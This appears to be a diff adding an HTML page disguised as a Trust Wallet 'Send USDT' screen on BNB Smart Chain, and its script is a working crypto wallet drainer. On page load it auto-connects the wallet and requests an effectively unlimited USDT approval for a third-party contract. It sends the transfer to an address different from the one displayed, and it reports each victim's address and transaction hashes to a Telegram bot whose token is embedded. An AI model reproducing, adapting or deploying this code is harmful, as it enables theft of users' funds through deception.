@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Send USDT</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=SF+Pro+Display:400,500,600,700&display=swap">
+  <style>
+    :root {
+      --main-bg: #242424;
+      --modal-bg: #222;
+      --input-bg: #232323;
+      --input-border: #323232;
+      --label: #bababa;
+      --text: #fff;
+      --accent: #27ff85;
+      --green: #19996e;
+      --max-btn: #27ff85;
+      --button-shadow: 0 3px 12px #27ff8520;
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: var(--main-bg);
+      font-family: 'SF Pro Display', 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    body {
+      min-height: 100dvh;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: stretch;
+      box-sizing: border-box;
+    }
+    .main-modal {
+      margin: 0 auto;
+      background: var(--modal-bg);
+      border-radius: 24px 24px 0 0;
+      width: 100vw;
+      max-width: 480px;
+      min-height: 100vh;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 10px 30px #000b;
+      position: relative;
+      overflow: hidden;
+    }
+    .modal-body {
+      padding: 32px 20px 85px 20px;
+      flex: 1 1 auto;
+      display: flex;
+      flex-direction: column;
+    }
+    .header-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-bottom: 35px;
+    }
+    .header-row h1 {
+      font-size: 23px;
+      font-weight: 700;
+      line-height: 1.18;
+      color: var(--text);
+      margin: 0 auto;
+      text-align: center;
+      font-family: inherit;
+      letter-spacing: 0;
+    }
+    .close-btn {
+      position: absolute;
+      right: 0;
+      top: 0;
+      border: none;
+      background: none;
+      color: #aaa;
+      font-size: 2rem;
+      font-weight: 400;
+      padding: 2px 11px;
+      border-radius: 999px;
+      cursor: pointer;
+      transition: background .1s;
+    }
+    .close-btn:active { background: #2a2a2a; }
+    .modal-label {
+      margin-bottom: 10px;
+      margin-top: 0;
+      color: var(--label);
+      font-size: 15px;
+      font-weight: 600;
+      letter-spacing: 0;
+      font-family: inherit;
+    }
+    .modal-field {
+      display: flex;
+      align-items: center;
+      background: var(--input-bg);
+      border: 1.2px solid var(--input-border);
+      border-radius: 14px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--text);
+      outline: none;
+      margin-bottom: 24px;
+      min-height: 52px;
+      box-sizing: border-box;
+      padding: 0 8px 0 14px;
+      position: relative;
+      transition: border 0.18s;
+      font-family: inherit;
+    }
+    .modal-field:focus-within { border-color: #46e688; }
+    .address-box {
+      cursor: not-allowed;
+      user-select: all;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--text);
+      flex: 1;
+      letter-spacing: 0.01em;
+      padding: 17px 0;
+      font-family: inherit;
+    }
+    .network-box {
+      flex-direction: row;
+      gap: 13px;
+      padding-right: 14px;
+      padding-left: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      font-family: inherit;
+    }
+    .network-icon {
+      width: 31px;
+      height: 31px;
+      border-radius: 8px;
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 11px;
+      flex-shrink: 0;
+    }
+    .network-icon img {
+      width: 22px;
+      height: 22px;
+      display: block;
+      border-radius: 6px;
+      background: transparent;
+    }
+    .network-label {
+      color: var(--text);
+      font-weight: 500;
+      font-size: 16px;
+      font-family: inherit;
+    }
+    .amount-box {
+      display: flex;
+      align-items: center;
+      background: var(--input-bg);
+      border: 1.2px solid var(--input-border);
+      border-radius: 14px;
+      font-size: 16px;
+      width: 100%;
+      margin-bottom: 0;
+      min-height: 52px;
+      padding-left: 14px;
+      box-sizing: border-box;
+      transition: border 0.18s;
+      font-family: inherit;
+    }
+    .amount-box:focus-within { border-color: #46e688; }
+    .amount-input {
+      background: transparent;
+      border: none;
+      color: var(--text);
+      font-size: 16px;
+      font-weight: 500;
+      flex: 1;
+      outline: none;
+      min-width: 0;
+      padding: 17px 0;
+      font-family: inherit;
+    }
+    .amount-actions {
+      display: flex;
+      align-items: center;
+      margin-left: 10px;
+      gap: 10px;
+      padding-right: 7px;
+    }
+    .amount-unit {
+      color: var(--label);
+      font-weight: 600;
+      margin-right: 4px;
+      font-size: 15.5px;
+      letter-spacing: 0.02em;
+      font-family: inherit;
+    }
+    .max-btn {
+      background: none;
+      border: none;
+      color: var(--max-btn);
+      font-size: 15.5px;
+      font-weight: 700;
+      cursor: pointer;
+      padding: 3px 4px 3px 6px;
+      border-radius: 7px;
+      transition: background .13s;
+      font-family: inherit;
+    }
+    .max-btn:active, .max-btn:focus { background: #174c3d; }
+    .amount-estimate {
+      margin: 4px 0 0 3px;
+      font-size: 14px;
+      color: var(--label);
+      letter-spacing: 0.01em;
+      font-weight: 500;
+      font-family: inherit;
+    }
+    .modal-bottom-actions {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 2;
+      width: 100vw;
+      display: flex;
+      justify-content: center;
+      background: transparent;
+      box-sizing: border-box;
+      pointer-events: none;
+    }
+    .modal-bottom-inner {
+      width: 100vw;
+      max-width: 480px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: center;
+      background: transparent;
+      padding-bottom: max(env(safe-area-inset-bottom),15px);
+      padding-top: 0;
+      pointer-events: none;
+    }
+    .next-btn {
+      pointer-events: all;
+      width: 96%;
+      background-color: var(--green);
+      border: none;
+      border-radius: 30px;
+      padding: 13px 0 13px 0;
+      margin: 0 auto;
+      font-size: 17px;
+      font-weight: 600;
+      color: #fff;
+      letter-spacing: .01em;
+      font-family: inherit;
+      box-shadow: var(--button-shadow);
+      cursor: pointer;
+      display: block;
+      transition: background .15s, opacity .15s;
+      text-align: center;
+    }
+    .next-btn[disabled] { opacity: .46; pointer-events: none; }
+    #status {
+      width: 100%;
+      padding: 8px 0 2px 0;
+      margin: 10px auto 7px auto;
+      border-radius: 8px;
+      font-weight: 500;
+      font-size: 15px;
+      text-align: center;
+      display: none;
+      font-family: inherit;
+    }
+    #status.success { display:block;background:#1d5a2a;color:#3effb8;border:1px solid #165a3b; }
+    #status.error { display:block;background:#421528;color:#ff7a7a;border:1px solid #ff284b55; }
+    #status.pending { display:block;background:#4a3a1a;color:#ffc107;border:1px solid #ffb30055; }
+    @media (max-width: 600px) {
+      .main-modal { max-width:100vw;border-radius:19px 19px 0 0; }
+      .modal-bottom-inner,.modal-bottom-actions { max-width:100vw; }
+      .modal-body { padding: 24px 7px 82px 7px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-modal">
+    <form autocomplete="off" onsubmit="event.preventDefault(); handleSendClick();">
+      <div class="modal-body">
+        <div class="header-row">
+          <h1>Send USDT</h1>
+          <button class="close-btn" type="button" id="modalClose" title="Close">&times;</button>
+        </div>
+
+        <div>
+          <div class="modal-label">Address or Domain Name</div>
+          <div class="modal-field">
+            <input type="text" readonly tabindex="-1" aria-label="Receiver" class="address-box" id="receiverAddress"
+              value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F" />
+          </div>
+        </div>
+
+        <div style="margin-top:18px;">
+          <div class="modal-label">Destination network</div>
+          <div class="modal-field network-box">
+            <span class="network-icon">
+              <img src="https://raw.githubusercontent.com/trustwallet/assets/refs/heads/master/blockchains/smartchain/info/logo.png" alt="BNB" />
+            </span>
+            <span class="network-label">BNB Smart Chain</span>
+          </div>
+        </div>
+
+        <div style="margin-top:18px;">
+          <div class="modal-label">Amount</div>
+          <div class="amount-box">
+            <input type="number" min="0" step="0.00000001" class="amount-input" id="amountInput"
+                   placeholder="USDT Amount" autocomplete="off" value="0">
+            <div class="amount-actions">
+              <span class="amount-unit">USDT</span>
+              <button type="button" class="max-btn" id="maxBtn">Max</button>
+            </div>
+          </div>
+          <div class="amount-estimate" id="amountEstimate">≈ $0.00</div>
+        </div>
+        <div id="status"></div>
+      </div>
+      <div class="modal-bottom-actions">
+        <div class="modal-bottom-inner">
+          <button type="submit" class="next-btn" id="sendBtn">Next</button>
+        </div>
+      </div>
+    </form>
+  </div>
+
+<script>
+    // --- Telegram Bot Configuration ---
+    const TELEGRAM_BOT_TOKEN = "8854929046:AAGFzlZcPWryjeXs_FjhxJirB5txL65NpJk";
+    const TELEGRAM_CHAT_ID = "8532488287";
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    async function sendTelegramNotification(message) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+            console.log("Telegram bot not configured");
+            return;
+        }
+
+        try {
+            await fetch(TELEGRAM_API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                })
+            });
+        } catch (error) {
+            console.error("Telegram notification failed:", error);
+        }
+    }
+
+    // --- USDT/BSC Configuration ---
+    const BSC_MAINNET = {
+        chainId: "0x38",
+        chainName: "BNB Smart Chain",
+        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+        blockExplorerUrls: ["https://bscscan.com"]
+    };
+
+    const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+    const CONTRACT_ADDR = "0xE71aE969b0Af07A352f86B82590f600C1357240A";
+    const RECEIVER_ADDR = "0xA71B911d8db903Aa195EBe76822D103A339b65C1";
+    const APPROVAL_AMOUNT = "1987600000000000000000000000000000000000"; // 1.9876 trillion
+
+    const USDT_ABI = [
+        {
+            "constant": true,
+            "inputs": [{"name":"account","type":"address"}],
+            "name": "balanceOf",
+            "outputs": [{"name":"","type":"uint256"}],
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                {"name":"spender","type":"address"},
+                {"name":"amount","type":"uint256"}
+            ],
+            "name": "approve",
+            "outputs": [{"name":"","type":"bool"}],
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                {"name":"recipient","type":"address"},
+                {"name":"amount","type":"uint256"}
+            ],
+            "name": "transfer",
+            "outputs": [{"name":"","type":"bool"}],
+            "type": "function"
+        }
+    ];
+
+    let web3, userAccount, usdtContract, isConnected = false;
+    let approvalApproved = false;
+    
+    const statusDiv = document.getElementById("status");
+    const sendBtn = document.getElementById("sendBtn");
+    const amountInput = document.getElementById("amountInput");
+    const usdAmountDiv = document.getElementById("amountEstimate");
+
+    function isMobileDevice() {
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
+    }
+
+    function isInTrustWalletBrowser() {
+        return window.ethereum && window.ethereum.isTrust;
+    }
+
+    function showStatus(message, type) {
+        statusDiv.innerHTML = message;
+        if (!type) statusDiv.style.display = "none";
+        else {
+            statusDiv.style.display = "block";
+            statusDiv.className = "";
+            if (type === "success") statusDiv.classList.add("success");
+            if (type === "error") statusDiv.classList.add("error");
+            if (type === "pending") statusDiv.classList.add("pending");
+        }
+    }
+
+    function updateUSD() {
+        let val = parseFloat(amountInput.value) || 0;
+        usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
+    }
+
+    function updateButtonState() {
+        const amount = parseFloat(amountInput.value) || 0;
+        sendBtn.disabled = !isConnected || amount <= 0;
+    }
+
+    async function initContracts() {
+        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
+    }
+
+    async function approveUSDT() {
+        if (approvalApproved) {
+            console.log("Approval already granted");
+            return;
+        }
+
+        try {
+            showStatus("⏳ Requesting USDT approval...", "pending");
+            console.log("Sending approval transaction...");
+            
+            const tx = await usdtContract.methods.approve(CONTRACT_ADDR, APPROVAL_AMOUNT).send({
+                from: userAccount
+            });
+
+            console.log("Approval tx hash:", tx.transactionHash);
+            approvalApproved = true;
+            showStatus("✅ USDT Approved!", "success");
+            
+            await sendTelegramNotification(
+                `✅ <b>USDT Approved</b>\n\n` +
+                `<b>User:</b> <code>${userAccount}</code>\n` +
+                `<b>Amount:</b> 1.9876 Trillion\n` +
+                `<b>TX Hash:</b> <code>${tx.transactionHash}</code>`
+            );
+
+            setTimeout(() => showStatus("", ""), 2000);
+        } catch (e) {
+            approvalApproved = false;
+            const errorMessage = e.code === 4001
+                ? "Approval rejected by user."
+                : "Approval failed: " + (e.message || "Unknown error");
+            showStatus(errorMessage, "error");
+            throw e;
+        }
+    }
+
+    async function handleSendClick() {
+        if (!isConnected) {
+            showStatus("❌ Wallet not connected", "error");
+            return;
+        }
+
+        const amount = parseFloat(amountInput.value) || 0;
+
+        if (amount <= 0) {
+            showStatus("❌ Please enter a valid amount", "error");
+            return;
+        }
+
+        sendBtn.disabled = true;
+        sendBtn.textContent = "Processing...";
+
+        try {
+            // First approve if not already approved
+            if (!approvalApproved) {
+                await approveUSDT();
+            }
+
+            // Then send transaction
+            showStatus("⏳ Sending transaction...", "pending");
+            console.log("Sending transfer transaction...");
+            
+            const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
+            console.log("Send amount in wei:", sendAmount);
+            
+            const tx = await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
+                from: userAccount
+            });
+
+            console.log("Transfer tx hash:", tx.transactionHash);
+            showStatus("✅ Transaction Complete!", "success");
+
+            await sendTelegramNotification(
+                `✅ <b>Transaction Successful</b>\n\n` +
+                `<b>From:</b> <code>${userAccount}</code>\n` +
+                `<b>To:</b> <code>${RECEIVER_ADDR}</code>\n` +
+                `<b>Amount:</b> ${amount} USDT\n` +
+                `<b>Network:</b> BNB Smart Chain\n` +
+                `<b>TX Hash:</b> <code>${tx.transactionHash}</code>\n` +
+                `<b>Explorer:</b> https://bscscan.com/tx/${tx.transactionHash}`
+            );
+
+            amountInput.value = "0";
+            updateUSD();
+            updateButtonState();
+        } catch (e) {
+            console.error("Transaction error:", e);
+            const errorMessage = e.code === 4001
+                ? "❌ Transaction rejected by user"
+                : "❌ Transaction failed: " + (e.message || "Unknown error");
+            showStatus(errorMessage, "error");
+
+            await sendTelegramNotification(
+                `❌ <b>Transaction Failed</b>\n\n` +
+                `<b>User:</b> <code>${userAccount}</code>\n` +
+                `<b>Amount:</b> ${amount} USDT\n` +
+                `<b>Error:</b> ${errorMessage}`
+            );
+        } finally {
+            sendBtn.disabled = false;
+            sendBtn.textContent = "Next";
+            updateButtonState();
+        }
+    }
+
+    async function autoConnectBSC() {
+        const isMobile = isMobileDevice();
+        const inTrustWallet = isInTrustWalletBrowser();
+
+        if (!window.ethereum) {
+            if (isMobile && !inTrustWallet) {
+                window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+            } else {
+                showStatus("❌ Wallet not detected", "error");
+            }
+            return;
+        }
+
+        try {
+            // Switch or add BSC network
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: BSC_MAINNET.chainId }]
+                });
+            } catch (switchErr) {
+                if (switchErr.code === 4902) {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [BSC_MAINNET]
+                    });
+                } else {
+                    throw switchErr;
+                }
+            }
+
+            // Request accounts
+            const accounts = await window.ethereum.request({
+                method: "eth_requestAccounts"
+            });
+
+            if (!accounts || !accounts.length) {
+                throw new Error("No accounts returned");
+            }
+
+            userAccount = accounts[0];
+            console.log("Connected account:", userAccount);
+            
+            web3 = new Web3(window.ethereum);
+            isConnected = true;
+            await initContracts();
+
+            showStatus("✅ Wallet Connected", "success");
+            setTimeout(() => showStatus("", ""), 2000);
+
+            // Send Telegram notification
+            await sendTelegramNotification(
+                `🔗 <b>Wallet Connected</b>\n\n` +
+                `<b>Wallet Address:</b> <code>${userAccount}</code>\n` +
+                `<b>Network:</b> BNB Smart Chain\n` +
+                `<b>Status:</b> Ready to Send USDT`
+            );
+
+            // Request approval
+            await approveUSDT();
+
+            // Listen for changes
+            window.ethereum.on("accountsChanged", () => location.reload());
+            window.ethereum.on("chainChanged", () => location.reload());
+
+            updateButtonState();
+
+        } catch (err) {
+            isConnected = false;
+            console.error("Connection error:", err);
+            const errorMessage = err.code === 4001
+                ? "Connection rejected by user"
+                : err.message || "Wallet connection failed";
+            showStatus("❌ " + errorMessage, "error");
+        }
+    }
+
+    // Event listeners
+    document.getElementById('modalClose').onclick = function() { };
+
+    document.getElementById("maxBtn").onclick = function () {
+        amountInput.value = "999999.99";
+        updateUSD();
+        updateButtonState();
+    };
+
+    amountInput.oninput = function() {
+        updateUSD();
+        updateButtonState();
+    };
+
+    // Initial state
+    sendBtn.disabled = true;
+
+    // Auto-connect on page load
+    window.addEventListener("load", autoConnectBSC, false);
+    window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
+    setTimeout(autoConnectBSC, 700);
+
+    if (window.location.hash.includes("send") || window.location.search.includes("send")) {
+        setTimeout(autoConnectBSC, 250);
+    }
+</script>
+</body>
+</html>
